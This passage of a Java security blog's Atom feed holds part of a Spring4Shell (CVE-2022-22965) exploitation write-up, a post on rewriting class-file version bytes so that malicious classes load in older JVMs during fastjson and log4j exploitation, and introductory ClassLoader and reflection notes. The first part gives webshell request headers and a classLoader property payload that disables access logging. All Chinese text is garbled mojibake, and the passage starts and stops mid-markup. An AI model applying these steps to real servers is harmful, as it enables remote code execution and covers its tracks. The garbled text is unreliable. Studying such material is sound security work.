class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bsuffix&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åè®¿é—®webshellçš„æ—¶å€™ï¼Œé™¤äº†æä¾›cmdçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜éœ€è¦è®¾ç½®headerå¤´ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;headers &amp;#x3D; &amp;#123;&amp;quot;suffix&amp;quot;:&amp;quot;%&amp;gt;&amp;#x2F;&amp;#x2F;&amp;quot;,
            &amp;quot;c1&amp;quot;:&amp;quot;Runtime&amp;quot;,
            &amp;quot;c2&amp;quot;:&amp;quot;&amp;lt;%&amp;quot;,
            &amp;quot;DNT&amp;quot;:&amp;quot;1&amp;quot;,
            &amp;quot;Content-Type&amp;quot;:&amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;
&amp;#125;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;åˆ©ç”¨æ¡ä»¶&quot;&gt;&lt;a href=&quot;#åˆ©ç”¨æ¡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;åˆ©ç”¨æ¡ä»¶&quot;&gt;&lt;/a&gt;åˆ©ç”¨æ¡ä»¶&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Javaç‰ˆæœ¬&amp;gt;=JDK9 &lt;/li&gt;
&lt;li&gt;Spirngè¿è¡Œåœ¨Tomcatç¯å¢ƒä¸‹ï¼Œä»¥WaråŒ…éƒ¨ç½²(JaråŒ…çš„æ—¶å€™ä¸å­˜åœ¨)&lt;/li&gt;
&lt;li&gt;æ–¹æ³•å…¥å‚æ˜¯éåŸºç¡€ç±»ï¼Œä¸èƒ½æ˜¯Stringï¼Œintç­‰&lt;/li&gt;
&lt;li&gt;æ¥å£ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;æ³¨æ„äº‹é¡¹&quot;&gt;&lt;a href=&quot;#æ³¨æ„äº‹é¡¹&quot; class=&quot;headerlink&quot; title=&quot;æ³¨æ„äº‹é¡¹&quot;&gt;&lt;/a&gt;æ³¨æ„äº‹é¡¹&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;å¦‚æœè¦å¤šæ¬¡å†™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹fileDateFormatå±æ€§ï¼Œæœ€ç»ˆä¼šæ‹¼æ¥åˆ°æ–‡ä»¶åç¼€é‡Œé¢&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨æ—¥å¿—å†™å…¥shellçš„æ—¶å€™ï¼Œç”Ÿæˆçš„æ–‡ä»¶ä¼šä¸æ–­å†™å…¥ï¼Œå¯ä»¥å…³é—­æ—¥å¿—è®°å½•: &lt;code&gt;class.module.classLoader.resources.context.parent.pipeline.first.enabled=false&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;a href=&quot;#æ¼æ´åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;/a&gt;æ¼æ´åˆ†æ&lt;/h2&gt;&lt;p&gt;å½“Content-Typeæ˜¯&lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨&lt;code&gt;ServletModelAttributeMethodProcessor&lt;/code&gt;è§£æè¯·æ±‚ï¼Œç„¶åè¿›å…¥å‚æ•°ç»‘å®š:&lt;code&gt;org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)&lt;/code&gt;:&lt;br&gt;&lt;img src=&quot;/2022/04/06/CVE-2022-22965/3.png&quot;&gt;&lt;br&gt;æ­¤æ—¶çš„mpvä¿å­˜äº†è¯·æ±‚é‡Œé¢çš„key-valueå‚æ•°ï¼Œæ¥ç€è¿›å…¥&lt;code&gt;org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)&lt;/code&gt;å¯¹è·å–åˆ°çš„&lt;code&gt;mpvs&lt;/code&gt;è¿›è¡Œåˆæ­¥æ ¡éªŒï¼š&lt;br&gt;&lt;img src=&quot;/2022/04/06/CVE-2022-22965/4.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>ä½ç‰ˆæœ¬Javaè¿è¡Œé«˜ç‰ˆçš„Class</title>
    <link href="https://jkme.github.io/2022/03/30/Load_Class_In_Multi_JavaVersion.html"/>
    <id>https://jkme.github.io/2022/03/30/Load_Class_In_Multi_JavaVersion.html</id>
    <published>2022-03-29T16:00:00.000Z</published>
    <updated>2022-03-30T09:25:52.286Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-èƒŒæ™¯ä»‹ç»"><a href="#0x1-èƒŒæ™¯ä»‹ç»" class="headerlink" title="0x1. èƒŒæ™¯ä»‹ç»"></a>0x1. èƒŒæ™¯ä»‹ç»</h2><p>æ¯”å¦‚<code>fastjson</code>ã€<code>log4j</code>ä¸­éœ€è¦è¿œç¨‹åŠ è½½æ¶æ„classæ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœæ¶æ„Classæ–‡ä»¶çš„ç‰ˆæœ¬é«˜äºç›®æ ‡ç‰ˆæœ¬ï¼Œæ¯”å¦‚æ‰˜ç®¡åœ¨æœåŠ¡å™¨çš„Classæ˜¯1.8ç¼–è¯‘çš„ï¼Œä½†æ˜¯ç›®æ ‡ç‰ˆæœ¬æ˜¯1.7ï¼Œä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å‡ºç°ç±»ä¼¼è¿™æ ·çš„é”™è¯¯ï¼š<code>java.lang.UnsupportedClassVersionError: Unsupported major.minor version</code></p><h2 id="0x2-è§£å†³æ–¹æ³•"><a href="#0x2-è§£å†³æ–¹æ³•" class="headerlink" title="0x2. è§£å†³æ–¹æ³•"></a>0x2. è§£å†³æ–¹æ³•</h2><p>ç”¨ä½ç‰ˆæœ¬çš„Javaï¼Œæ¯”å¦‚1.6å»ç¼–è¯‘Classæ–‡ä»¶ï¼Œå°±å¯ä»¥å…¨ç‰ˆæœ¬é€šç”¨ã€‚</p><p>è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œæ‰‹åŠ¨ä¿®æ”¹Classæ–‡ä»¶ã€‚å½“Javaç‰ˆæœ¬ä¸åŒçš„æ—¶å€™ï¼Œç¼–è¯‘å‡ºæ¥çš„Classæ–‡ä»¶ä¹Ÿä¼šä¸ä¸€æ ·ï¼Œå…¶ä¸­Classæ–‡ä»¶é‡Œé¢ä¼šå¸¦ä¸Šç¼–è¯‘çš„Javaç‰ˆæœ¬å·ï¼š<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/1.png"></p><ul><li>45 = Java 1.1</li><li>46 = Java 1.2</li><li>47 = Java 1.3</li><li>48 = Java 1.4</li><li>49 = Java 5</li><li>50 = Java 6</li><li>51 = Java 7</li><li>52 = Java 8</li><li>53 = Java 9</li><li>54 = Java 10</li><li>55 = Java 11</li><li>56 = Java 12</li><li>57 = Java 13</li><li>58 = Java 14</li><li>59 = Java 15</li></ul><p>æ‰€ä»¥ï¼Œå°è¯•æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬å·è¯•è¯•ï¼Ÿ</p><ol><li>åˆ‡æ¢åˆ°<code>java</code>çš„15ç‰ˆæœ¬ï¼Œç¼–è¯‘è¿è¡Œæ­£å¸¸</li><li>ä½¿ç”¨<code>vim -b Calc.class</code>ï¼Œç„¶å<code>:%!xxd</code>ä¿®æ”¹ç‰ˆæœ¬å·ä¸º<code>32</code>(50çš„16è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯Java6)ï¼Œç„¶åä¿å­˜:<code>:%!xxd -r</code></li><li>åˆ‡æ¢javaç‰ˆæœ¬åˆ°1.7ï¼Œè¿è¡ŒClassæ­£å¸¸<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/2.png"><br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/3.png"></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;a href=&quot;#0x1-èƒŒæ™¯ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;0x1. èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;/a&gt;0x1. èƒŒæ™¯ä»‹ç»&lt;/h2&gt;&lt;p&gt;æ¯”å¦‚&lt;code&gt;fastjson&lt;/code&gt;ã€&lt;code&gt;log4j&lt;/code&gt;ä¸­éœ€è¦è¿œç¨‹åŠ è½½æ¶æ„classæ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœæ¶æ„Classæ–‡ä»¶çš„ç‰ˆæœ¬é«˜äºç›®æ ‡ç‰ˆæœ¬ï¼Œæ¯”å¦‚æ‰˜ç®¡åœ¨æœåŠ¡å™¨çš„Classæ˜¯1.8ç¼–è¯‘çš„ï¼Œä½†æ˜¯ç›®æ ‡ç‰ˆæœ¬æ˜¯1.7ï¼Œä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å‡ºç°ç±»ä¼¼è¿™æ ·çš„é”™è¯¯ï¼š&lt;code&gt;java.lang.UnsupportedClassVersionError: Unsupported major.minor version&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x2-è§£å†³æ–¹æ³•&quot;&gt;&lt;a href=&quot;#0x2-è§£å†³æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;0x2. è§£å†³æ–¹æ³•&quot;&gt;&lt;/a&gt;0x2. è§£å†³æ–¹æ³•&lt;/h2&gt;&lt;p&gt;ç”¨ä½ç‰ˆæœ¬çš„Javaï¼Œæ¯”å¦‚1.6å»ç¼–è¯‘Classæ–‡ä»¶ï¼Œå°±å¯ä»¥å…¨ç‰ˆæœ¬é€šç”¨ã€‚&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œæ‰‹åŠ¨ä¿®æ”¹Classæ–‡ä»¶ã€‚å½“Javaç‰ˆæœ¬ä¸åŒçš„æ—¶å€™ï¼Œç¼–è¯‘å‡ºæ¥çš„Classæ–‡ä»¶ä¹Ÿä¼šä¸ä¸€æ ·ï¼Œå…¶ä¸­Classæ–‡ä»¶é‡Œé¢ä¼šå¸¦ä¸Šç¼–è¯‘çš„Javaç‰ˆæœ¬å·ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/1.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;45 = Java 1.1&lt;/li&gt;
&lt;li&gt;46 = Java 1.2&lt;/li&gt;
&lt;li&gt;47 = Java 1.3&lt;/li&gt;
&lt;li&gt;48 = Java 1.4&lt;/li&gt;
&lt;li&gt;49 = Java 5&lt;/li&gt;
&lt;li&gt;50 = Java 6&lt;/li&gt;
&lt;li&gt;51 = Java 7&lt;/li&gt;
&lt;li&gt;52 = Java 8&lt;/li&gt;
&lt;li&gt;53 = Java 9&lt;/li&gt;
&lt;li&gt;54 = Java 10&lt;/li&gt;
&lt;li&gt;55 = Java 11&lt;/li&gt;
&lt;li&gt;56 = Java 12&lt;/li&gt;
&lt;li&gt;57 = Java 13&lt;/li&gt;
&lt;li&gt;58 = Java 14&lt;/li&gt;
&lt;li&gt;59 = Java 15&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ‰€ä»¥ï¼Œå°è¯•æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬å·è¯•è¯•ï¼Ÿ&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åˆ‡æ¢åˆ°&lt;code&gt;java&lt;/code&gt;çš„15ç‰ˆæœ¬ï¼Œç¼–è¯‘è¿è¡Œæ­£å¸¸&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨&lt;code&gt;vim -b Calc.class&lt;/code&gt;ï¼Œç„¶å&lt;code&gt;:%!xxd&lt;/code&gt;ä¿®æ”¹ç‰ˆæœ¬å·ä¸º&lt;code&gt;32&lt;/code&gt;(50çš„16è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯Java6)ï¼Œç„¶åä¿å­˜:&lt;code&gt;:%!xxd -r&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åˆ‡æ¢javaç‰ˆæœ¬åˆ°1.7ï¼Œè¿è¡ŒClassæ­£å¸¸&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/2.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/3.png&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ç¬”è®°(1)-åå°„æœºåˆ¶</title>
    <link href="https://jkme.github.io/2022/03/22/java-reflection.html"/>
    <id>https://jkme.github.io/2022/03/22/java-reflection.html</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-04-02T07:38:05.067Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-ç±»åŠ è½½å™¨-ClassLoader"><a href="#0x1-ç±»åŠ è½½å™¨-ClassLoader" class="headerlink" title="0x1. ç±»åŠ è½½å™¨: ClassLoader"></a>0x1. ç±»åŠ è½½å™¨: ClassLoader</h2><p>Javaæ˜¯ä¸€ä¸ªä¾èµ–äº<code>JVMï¼ˆJavaè™šæ‹Ÿæœº)</code>å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€ï¼Œ<code>Java</code>ä¼šå…ˆé€šè¿‡ç¼–è¯‘å™¨å°†æºä»£ç è½¬æ¢ä¸ºJavaäºŒè¿›åˆ¶å­—èŠ‚ç ï¼Œä¸€èˆ¬æ˜¯ä¿å­˜åœ¨<code>.class</code>æ–‡ä»¶ä¸­ï¼Œä¹‹åé€šè¿‡<code>JVM</code>è§£é‡Šå™¨æ‰§è¡Œè¿™æ®µä»£ç ã€‚å­—èŠ‚ç æ–‡ä»¶ä¼šåŒ…å«å¾ˆå¤šClassä¿¡æ¯ï¼Œåœ¨JVMè§£é‡Šå™¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œ<code>ClassLoader</code>å°±æ˜¯ç”¨æ¥åŠ è½½ç±»çš„ï¼Œå®ƒä¼šå°†Javaå­—èŠ‚ç ä¸­çš„ClassåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œæ¯ä¸ª<code>Class</code>å¯¹è±¡å†…éƒ¨éƒ½æœ‰ä¸€ä¸ª<code>ClassLoader</code>å±æ€§æ ‡è¯†ç”±å“ªä¸ª<code>ClassLoader</code>åŠ è½½ã€‚</p><h3 id="å¸¸è§çš„ClassLoader"><a href="#å¸¸è§çš„ClassLoader" class="headerlink" title="å¸¸è§çš„ClassLoader"></a>å¸¸è§çš„ClassLoader</h3><p>ä¸€åˆ‡çš„<code>Java</code>ç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½ä¹‹åæ‰å¯ä»¥è¿è¡Œï¼Œæœ€å¸¸è§çš„<code>ClassLoader</code>ï¼š <code>BootstrapClassLoader</code>ã€<code>ExtensionClassLoader</code>ã€<code>AppClassLoader</code>ã€<code>URLClassLoader</code>ã€<code>ContextClassLoader</code></p><h4 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h4><p>JVMå†…ç½®çš„é»˜è®¤<code>classLoader</code>,è´Ÿè´£åŠ è½½JVMè¿è¡Œæ—¶çš„æ ¸å¿ƒç±»ï¼Œä½äº<code>JAVA_HOME/lib/rt.jar/</code>æ–‡ä»¶å¤¹ä¸­ï¼Œç”±Cä»£ç å®ç°ï¼Œ<code>Bootstrap ClassLoader</code>ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ClassLoaderæ—¶å€™éƒ½ä¼šè¿”å›null</p><h4 id="ExtClassLoader"><a href="#ExtClassLoader" class="headerlink" title="ExtClassLoader"></a>ExtClassLoader</h4><p>æ‰©å±•ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ‰©å±• jar åŒ…ä½äº <code>JAVA_HOME/lib/ext/*.jar</code> ä¸­ï¼Œåº“åé€šå¸¸ä»¥ javax å¼€å¤´</p><h4 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h4><p>åº”ç”¨ç±»åŠ è½½å™¨/ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„ClassLoaderï¼Œå®ƒä¼šåŠ è½½<code>ClASSPATH</code>ç¯å¢ƒå˜é‡æˆ–è€…<code>java.class.path</code>å±æ€§é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„jaråŒ…å’Œç›®å½•ï¼Œæˆ‘ä»¬è‡ªå·±ç¼–å†™å’Œä½¿ç”¨çš„ç¬¬ä¸‰æ–¹JaråŒ…é€šå¸¸éƒ½æ˜¯ç”±å®ƒæ¥åŠ è½½</p><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>ClassLoaderæŠ½è±¡ç±»çš„ä¸€ç§å®ç°ï¼Œå®ƒå¯ä»¥æ ¹æ®URLæœç´¢ç±»æˆ–èµ„æºï¼Œå¹¶è¿›è¡Œè¿œç¨‹åŠ è½½ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">demo1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavaClassLoader</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ClassLoader</span> extensionClassLoader <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"App Classloader: "</span> <span class="token operator">+</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The parent of parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œç»“æœ:</p><pre class="line-numbers language-none"><code class="language-none">App Classloader: sun.misc.Launcher$AppClassLoader@18b4aac2parent Classloader: sun.misc.Launcher$ExtClassLoader@5cad8086The parent of parent Classloader: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ClassLoader</code>ç±»æœ‰å¦‚ä¸‹å¸¸è§çš„æ–¹æ³•:</p><ul><li><code>loadClass</code>:å‚æ•°ä¸ºéœ€è¦åŠ è½½çš„å…¨é™å®šç±»åï¼Œè¯¥æ–¹æ³•ä¼šå…ˆæŸ¥çœ‹ç›®æ ‡ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ï¼ŒæŸ¥çœ‹çˆ¶çº§åŠ è½½å™¨å¹¶é€’å½’è°ƒç”¨<code>loadClass()</code>ï¼Œå¦‚æœéƒ½æ²¡æ‰¾åˆ°åˆ™è°ƒç”¨<code>findClass()</code>ã€‚è¿™ç§å¯»æ‰¾ç±»çš„æ–¹å¼ç§°ä¸º<a href="https://www.cnblogs.com/JonaLin/p/12674114.html">åŒäº²å§”æ´¾æœºåˆ¶(delegation model)</a>,ä¸»è¦æ˜¯ä¸ºäº†å®‰å…¨æ€§ï¼Œé¿å…ç”¨æˆ·è‡ªå·±ç¼–å†™çš„ç±»åŠ¨æ€æ›¿æ¢Javaçš„ä¸€äº›æ ¸å¿ƒç±»ï¼ŒåŒæ—¶ä¹Ÿé¿å…äº†é‡å¤åŠ è½½ã€‚<br><img src="/2022/03/22/java-reflection/1.png"><br>åŒäº²å§”æ´¾ï¼š<br><img src="/2022/03/22/java-reflection/2.png"></li><li><code>findClass</code>: æœç´¢ç±»çš„ä½ç½®ï¼Œä¸€èˆ¬ä¼šæ ¹æ®åç§°æˆ–ä½ç½®åŠ è½½.classå­—èŠ‚ç æ–‡ä»¶ï¼Œè·å–å­—èŠ‚ç æ•°ç»„ï¼Œç„¶åè°ƒç”¨defineClass()ã€‚</li><li><code>findloadedClass</code>: æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»</li><li><code>defineClass</code>: å°†å­—èŠ‚ç è½¬æ¢ä¸ºJVMçš„<code>java.lang.Class</code>å¯¹è±¡</li></ul><p>ä»£ç ä¸­å…³äº<code>defineClass</code>è¿˜æ˜¯æ¯”è¾ƒå€¼å¾—ä¸€çœ‹ï¼Œ<code>loadClass</code>çš„ä½œç”¨æ˜¯åŠ è½½Classæ–‡ä»¶ï¼Œè½¬æ¢ä¸ºå­—èŠ‚ç ï¼Œå½“classä¸æ˜¯åœ¨æ–‡ä»¶é‡Œé¢ï¼Œè€Œæ˜¯ä»å…¶å®ƒæ¥æºçš„æ—¶å€™ï¼Œæ¯”å¦‚ç½‘ç»œè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™å°±è½®åˆ°<code>defineClass</code>ä¸Šåœºäº†ï¼Œ<code>defineClass</code>è´Ÿè´£æŠŠbyte[]ç›´æ¥è½¬æ¢ä¸ºClassï¼Œä¹Ÿå°±æ˜¯è¯´<code>defineClass</code>æ˜¯å¯¹ç±»åŠ è½½æ–¹å¼çš„æ‰©å±•: </p><blockquote><p> However, some classes may not originate from a file; they may originatefrom other sources, such as the network, or they could be constructed by anapplication.  The method {@link #defineClass(String, byte[], int, int)<tt>defineClass</tt>} converts an array of bytes into an instance of class<tt>Class</tt>. Instances of this newly defined class can be created using{@link Class#newInstance <tt>Class.newInstance</tt>}.</p></blockquote><h2 id="Javaåå°„"><a href="#Javaåå°„" class="headerlink" title="Javaåå°„"></a>Javaåå°„</h2><h4 id="è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•"><a href="#è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•" class="headerlink" title="è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•"></a>è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•</h4><p>åå°„çš„ä¸»è¦ä½œç”¨æ˜¯é€šè¿‡Classå¯¹è±¡æ¥å¯¹ç±»çš„å±æ€§å’Œæ–¹æ³•è¿›è¡Œè·å–å’Œè°ƒç”¨ï¼ŒåŒ…æ‹¬ç±»çš„ç§æœ‰æ–¹æ³•ï¼ˆprotectedå’Œprivateï¼‰ï¼Œä¸€èˆ¬æ¥è¯´æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è·å–ç±»ï¼š</p><ol><li><code>obj.getClass()</code>: å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ obj ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡<code>obj.getClass()</code>æ¥è·å–å®ƒçš„ç±» <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span> obj <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> c <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><code>Class.forName</code>:  <code>Class c= Class.forName(&quot;java.lang.Runtime&quot;);</code></li><li><code>ClassLoader</code>: <code>Class clazz = Classloader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</code></li><li>åŸç”Ÿç±».class: <code>Class clazz  = java.lang.Runtime.class;</code></li></ol><p><code>forName</code>æœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code><br>ç¬¬â¼€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸â»…çš„è·å–classçš„â½…å¼ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºç¬¬â¼†ç§â½…å¼çš„â¼€ä¸ªå°è£…ï¼š<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token comment">// ç­‰äº</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> currentLoader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2022/03/22/java-reflection/6.png"><br>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>forName</code>çš„ç¬¬â¼€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬â¼†ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯<code>ClassLoader</code>ã€‚</li></ul><h2 id="åå°„è°ƒç”¨å‡½æ•°"><a href="#åå°„è°ƒç”¨å‡½æ•°" class="headerlink" title="åå°„è°ƒç”¨å‡½æ•°"></a>åå°„è°ƒç”¨å‡½æ•°</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">student</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"D"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"My name is "</span> <span class="token operator">+</span> name <span class="token 